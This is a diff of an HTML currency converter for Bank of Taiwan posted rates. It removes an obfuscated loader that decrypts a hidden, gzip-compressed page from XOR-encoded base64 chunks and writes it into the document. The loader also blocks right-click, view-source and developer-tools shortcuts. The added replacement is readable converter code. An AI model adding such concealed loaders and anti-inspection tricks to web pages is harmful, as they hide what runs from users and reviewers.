@@ -1,12 +1,489 @@
 <!DOCTYPE html>
-<html lang="zh-Hant">
+<html lang="zh-TW">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>台灣銀行即時牌告匯率換算比較</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>台灣銀行即時牌告匯率換算比較</title>
+  <style>
+    :root {
+      --primary: #1d4ed8;
+      --primary-hover: #1e40af;
+      --bg: #f8fafc;
+      --card: #ffffff;
+      --border: #e2e8f0;
+      --text: #0f172a;
+      --muted: #64748b;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang TC", "Microsoft JhengHei", sans-serif; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      padding: 24px 16px;
+      display: flex;
+      justify-content: center;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 720px;
+      background: var(--card);
+      border-radius: 16px;
+      box-shadow: 0 10px 30px -5px rgba(0, 0, 0, 0.05);
+      border: 1px solid var(--border);
+      padding: 28px;
+    }
+
+    header {
+      margin-bottom: 20px;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    header h1 {
+      font-size: 1.45rem;
+      font-weight: 700;
+      color: #1e293b;
+    }
+
+    .status-badge {
+      font-size: 0.75rem;
+      padding: 4px 10px;
+      border-radius: 999px;
+      background: #f1f5f9;
+      color: var(--muted);
+      border: 1px solid var(--border);
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .status-badge.online {
+      background: #ecfdf5;
+      color: #059669;
+      border-color: #a7f3d0;
+    }
+
+    .status-badge.loading {
+      background: #eff6ff;
+      color: var(--primary);
+      border-color: #bfdbfe;
+    }
+
+    .controls-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 20px;
+      background: #f8fafc;
+      padding: 12px;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+    }
+
+    .segmented-control {
+      display: flex;
+      background: #e2e8f0;
+      border-radius: 8px;
+      padding: 3px;
+    }
+
+    .segmented-control button {
+      flex: 1;
+      padding: 8px 10px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      border: none;
+      background: transparent;
+      color: var(--muted);
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.15s ease;
+    }
+
+    .segmented-control button.active {
+      background: #ffffff;
+      color: var(--primary);
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #334155;
+    }
+
+    .input-row {
+      display: grid;
+      grid-template-columns: 1fr 160px;
+      gap: 12px;
+    }
+
+    input[type="number"], select {
+      width: 100%;
+      padding: 11px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      font-size: 1rem;
+      background: #fff;
+      color: var(--text);
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    input[type="number"]:focus, select:focus {
+      border-color: var(--primary);
+    }
+
+    .targets-section {
+      background: #f8fafc;
+      border-radius: 12px;
+      padding: 14px 16px;
+      margin-bottom: 20px;
+      border: 1px dashed var(--border);
+    }
+
+    .target-selectors {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 10px;
+      margin-top: 6px;
+    }
+
+    .results-grid {
+      display: grid;
+      gap: 12px;
+    }
+
+    .card {
+      border: 1.5px solid var(--border);
+      border-radius: 12px;
+      padding: 16px 20px;
+      background: #fff;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .card.usd {
+      border-color: var(--primary);
+      background: #f0f7ff;
+    }
+
+    .card-currency .name {
+      font-weight: 700;
+      font-size: 1.05rem;
+      color: var(--text);
+    }
+
+    .card-currency .rate-info {
+      font-size: 0.75rem;
+      color: var(--muted);
+      margin-top: 3px;
+    }
+
+    .card-amount {
+      text-align: right;
+    }
+
+    .card-amount .value {
+      font-size: 1.35rem;
+      font-weight: 700;
+      color: var(--primary);
+    }
+
+    .card-amount .symbol {
+      font-size: 0.85rem;
+      color: var(--muted);
+      margin-left: 4px;
+    }
+
+    .hint {
+      font-size: 0.75rem;
+      color: var(--muted);
+      margin-top: 18px;
+      line-height: 1.5;
+      border-top: 1px solid var(--border);
+      padding-top: 12px;
+    }
+  </style>
 </head>
 <body>
-<noscript>此頁面需要啟用 JavaScript 才能顯示內容。</noscript>
-<script>(async function(){var _c=["6vlMRczsfw==","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"];var _p=_c.reverse().join('');function _d(s){var t=atob(s),a=new Uint8Array(t.length);for(var i=0;i<t.length;i++)a[i]=t.charCodeAt(i);return a;}function _x(d,k){var o=new Uint8Array(d.length);for(var i=0;i<d.length;i++)o[i]=d[i]^k[i%k.length];return o;}var _k=_d("FolRsvbsf3Ruz4Sa8uKnnUxD1Nbg++5i");try{var b=_d(_p);b=_x(b,_k);b=new Uint8Array(await new Response(new Blob([b]).stream().pipeThrough(new DecompressionStream('gzip'))).arrayBuffer());var h=new TextDecoder().decode(b);document.open();document.write(h);document.close();document.addEventListener('contextmenu',function(e){e.preventDefault();});document.addEventListener('keydown',function(e){var k=e.keyCode;if(k===123||(e.ctrlKey&&k===85)||(e.ctrlKey&&e.shiftKey&&(k===73||k===74||k===67))){e.preventDefault();}});}catch(e){document.documentElement.innerHTML='<body style="font-family:sans-serif;padding:40px;color:#900">內容載入失敗：'+e+'</body>';}})();</script>
+
+<div class="container">
+  <header>
+    <div>
+      <h1>🇹🇼 台灣銀行匯率換算比較</h1>
+      <p style="font-size: 0.8rem; color: var(--muted); margin-top: 2px;">
+        支援現金 / 即期買賣牌告與多幣別即時對照
+      </p>
+    </div>
+    <span class="status-badge" id="status-tag">檢查連線中...</span>
+  </header>
+
+  <!-- 匯率模式切換 -->
+  <div class="controls-grid">
+    <div>
+      <label>匯率類別</label>
+      <div class="segmented-control" id="rateTypeGroup">
+        <button type="button" class="active" data-val="sight">即期匯率 (帳戶/轉帳)</button>
+        <button type="button" data-val="cash">現金匯率 (現鈔鈔票)</button>
+      </div>
+    </div>
+    <div>
+      <label>交易情境（民眾視角）</label>
+      <div class="segmented-control" id="tradeSideGroup">
+        <button type="button" class="active" data-val="sell">兌換外幣 (台銀賣出)</button>
+        <button type="button" data-val="buy">換回台幣 (台銀買入)</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- 輸入金額與基準幣別 -->
+  <div class="form-group">
+    <label>請輸入換算金額與來源幣別</label>
+    <div class="input-row">
+      <input type="number" id="base-amount" value="1000" min="0" step="any" placeholder="請輸入金額">
+      <select id="base-currency"></select>
+    </div>
+  </div>
+
+  <!-- 多國比較選擇器：固定比較 USD，下方可選 3 個自選幣別（包含新台幣） -->
+  <div class="targets-section">
+    <label>自訂比較幣別（除美元外，最多選擇 3 個目標幣別）：</label>
+    <div class="target-selectors">
+      <select id="target-1"></select>
+      <select id="target-2"></select>
+      <select id="target-3"></select>
+    </div>
+  </div>
+
+  <!-- 換算結果卡片清單 -->
+  <label>換算結果對照：</label>
+  <div class="results-grid" id="results-container"></div>
+
+  <div class="hint">
+    • <b>即期匯率</b>：適用於網銀線上結匯、外幣定存、信用卡海外消費扣款。<br>
+    • <b>現金匯率</b>：適用於台銀臨櫃或外幣 ATM 提領實體現鈔。<br>
+    • <b>新台幣比較</b>：若來源為外幣，您可直接在比較欄選擇「新台幣 (TWD)」對照能換得的台幣總額。
+  </div>
+</div>
+
+<script>
+  // 請替換為您的 Apps Script 網頁應用程式 URL
+  const GOOGLE_GAS_API_URL = "https://script.google.com/macros/s/AKfycbx.../exec";
+
+  // 完整預設備份資料（保證 USD 與各主流外幣均有值）
+  let ratesData = {
+    TWD: { name: "新台幣", cashBuy: 1, cashSell: 1, sightBuy: 1, sightSell: 1 },
+    USD: { name: "美元", cashBuy: 31.85, cashSell: 32.55, sightBuy: 32.18, sightSell: 32.28 },
+    JPY: { name: "日圓", cashBuy: 0.208, cashSell: 0.221, sightBuy: 0.215, sightSell: 0.219 },
+    EUR: { name: "歐元", cashBuy: 34.65, cashSell: 36.00, sightBuy: 35.15, sightSell: 35.55 },
+    CNY: { name: "人民幣", cashBuy: 4.38, cashSell: 4.54, sightBuy: 4.45, sightSell: 4.50 },
+    HKD: { name: "港幣", cashBuy: 4.02, cashSell: 4.22, sightBuy: 4.12, sightSell: 4.18 },
+    GBP: { name: "英鎊", cashBuy: 41.20, cashSell: 43.32, sightBuy: 42.10, sightSell: 42.52 },
+    AUD: { name: "澳幣", cashBuy: 21.15, cashSell: 21.93, sightBuy: 21.42, sightSell: 21.65 },
+    SGD: { name: "新加坡幣", cashBuy: 24.10, cashSell: 25.01, sightBuy: 24.45, sightSell: 24.63 },
+    KRW: { name: "韓元", cashBuy: 0.0221, cashSell: 0.0260, sightBuy: 0.0235, sightSell: 0.0245 },
+    THB: { name: "泰銖", cashBuy: 0.85, cashSell: 1.04, sightBuy: 0.93, sightSell: 0.97 },
+    VND: { name: "越南盾", cashBuy: 0.00115, cashSell: 0.00145, sightBuy: 0.00125, sightSell: 0.00135 }
+  };
+
+  let currentRateType = "sight";
+  let currentTradeSide = "sell";
+
+  const baseAmountEl = document.getElementById("base-amount");
+  const baseCurrencyEl = document.getElementById("base-currency");
+  const target1El = document.getElementById("target-1");
+  const target2El = document.getElementById("target-2");
+  const target3El = document.getElementById("target-3");
+  const resultsContainer = document.getElementById("results-container");
+  const statusTag = document.getElementById("status-tag");
+
+  function getEffectiveRate(currencyCode, side) {
+    if (currencyCode === "TWD") return 1.0;
+    const item = ratesData[currencyCode];
+    if (!item) return 1.0;
+
+    let key = currentRateType + (side === "sell" ? "Sell" : "Buy");
+    let rate = item[key];
+    if (!rate || rate <= 0) {
+      key = "sight" + (side === "sell" ? "Sell" : "Buy");
+      rate = item[key];
+    }
+    return rate || 1.0;
+  }
+
+  function initSelectors() {
+    const prevBase = baseCurrencyEl.value || "TWD";
+    const prevT1 = target1El.value || "JPY";
+    const prevT2 = target2El.value || "KRW";
+    const prevT3 = target3El.value || "THB";
+
+    const keys = Object.keys(ratesData);
+
+    // 1. 來源幣別選單：必須包含 USD 及全部幣別
+    baseCurrencyEl.innerHTML = "";
+    keys.forEach(k => {
+      baseCurrencyEl.add(new Option(`${ratesData[k].name} (${k})`, k));
+    });
+    baseCurrencyEl.value = keys.includes(prevBase) ? prevBase : "TWD";
+
+    // 2. 自訂比較選單：包含 TWD，僅排除 USD（因為 USD 已固定在最上方比較）
+    const compareKeys = keys.filter(k => k !== "USD");
+
+    [target1El, target2El, target3El].forEach(sel => {
+      sel.innerHTML = "";
+      sel.add(new Option("-- 不選擇 --", "NONE"));
+      compareKeys.forEach(k => {
+        sel.add(new Option(`${ratesData[k].name} (${k})`, k));
+      });
+    });
+
+    target1El.value = compareKeys.includes(prevT1) ? prevT1 : "JPY";
+    target2El.value = compareKeys.includes(prevT2) ? prevT2 : "KRW";
+    target3El.value = compareKeys.includes(prevT3) ? prevT3 : "THB";
+  }
+
+  function calculate() {
+    const amount = parseFloat(baseAmountEl.value);
+    const baseCur = baseCurrencyEl.value;
+
+    if (isNaN(amount) || amount < 0) {
+      resultsContainer.innerHTML = '<div style="color: #ef4444; padding: 12px;">請輸入有效金額</div>';
+      return;
+    }
+
+    // 換算為中介台幣價值
+    let twdAmount = 0;
+    if (baseCur === "TWD") {
+      twdAmount = amount;
+    } else {
+      const baseRate = getEffectiveRate(baseCur, "buy");
+      twdAmount = amount * baseRate;
+    }
+
+    // 收集比較清單：USD 固定置頂 + 3 個自選
+    const targets = ["USD"];
+    [target1El.value, target2El.value, target3El.value].forEach(v => {
+      if (v && v !== "NONE" && !targets.includes(v)) {
+        targets.push(v);
+      }
+    });
+
+    resultsContainer.innerHTML = "";
+
+    targets.forEach(targetCur => {
+      let finalAmount = 0;
+      let displayRate = 1;
+
+      if (targetCur === "TWD") {
+        finalAmount = twdAmount;
+        displayRate = 1;
+      } else {
+        displayRate = getEffectiveRate(targetCur, currentTradeSide);
+        finalAmount = twdAmount / displayRate;
+      }
+
+      const isUSD = targetCur === "USD";
+      const decimals = ["JPY", "KRW", "VND"].includes(targetCur) ? 0 : 2;
+      const formatted = finalAmount.toLocaleString("en-US", {
+        minimumFractionDigits: decimals,
+        maximumFractionDigits: decimals
+      });
+
+      const typeLabel = currentRateType === "sight" ? "即期" : "現金";
+      const sideLabel = currentTradeSide === "sell" ? "賣出價" : "買入價";
+
+      const card = document.createElement("div");
+      card.className = `card ${isUSD ? "usd" : ""}`;
+      card.innerHTML = `
+        <div class="card-currency">
+          <div class="name">${isUSD ? "🇺🇸 " : ""}${ratesData[targetCur]?.name || targetCur} (${targetCur})</div>
+          <div class="rate-info">
+            ${targetCur === "TWD" ? "基準貨幣" : `台銀${typeLabel}${sideLabel}：1 ${targetCur} =${displayRate} TWD`}
+          </div>
+        </div>
+        <div class="card-amount">
+          <span class="value">${formatted}</span>
+          <span class="symbol">${targetCur}</span>
+        </div>
+      `;
+      resultsContainer.appendChild(card);
+    });
+  }
+
+  function setupSegmentedControls() {
+    const bindToggle = (groupId, callback) => {
+      const group = document.getElementById(groupId);
+      group.querySelectorAll("button").forEach(btn => {
+        btn.addEventListener("click", () => {
+          group.querySelectorAll("button").forEach(b => b.classList.remove("active"));
+          btn.classList.add("active");
+          callback(btn.dataset.val);
+          calculate();
+        });
+      });
+    };
+
+    bindToggle("rateTypeGroup", val => currentRateType = val);
+    bindToggle("tradeSideGroup", val => currentTradeSide = val);
+  }
+
+  async function fetchFromGoogleSheet() {
+    if (!GOOGLE_GAS_API_URL || GOOGLE_GAS_API_URL.includes("AKfycbx...")) {
+      statusTag.innerText = "● 離線牌告就緒";
+      initSelectors();
+      calculate();
+      return;
+    }
+
+    try {
+      statusTag.innerText = "⏳ 正在同步期交所匯率...";
+      statusTag.className = "status-badge loading";
+
+      const res = await fetch(GOOGLE_GAS_API_URL);
+      if (!res.ok) throw new Error("HTTP " + res.status);
+
+      const data = await res.json();
+      if (data && Object.keys(data).length > 2) {
+        ratesData = data;
+        statusTag.innerText = "● 已連線同步最新牌告匯率";
+        statusTag.className = "status-badge online";
+      }
+
+      initSelectors();
+      calculate();
+    } catch (err) {
+      console.warn("使用預設備份資料:", err);
+      statusTag.innerText = "○ 連線異常 (使用內建牌告)";
+      statusTag.className = "status-badge";
+      initSelectors();
+      calculate();
+    }
+  }
+
+  [baseAmountEl, baseCurrencyEl, target1El, target2El, target3El].forEach(el => {
+    el.addEventListener("input", calculate);
+    el.addEventListener("change", calculate);
+  });
+
+  setupSegmentedControls();
+  initSelectors();
+  calculate();
+  fetchFromGoogleSheet();
+</script>
 </body>
 </html>
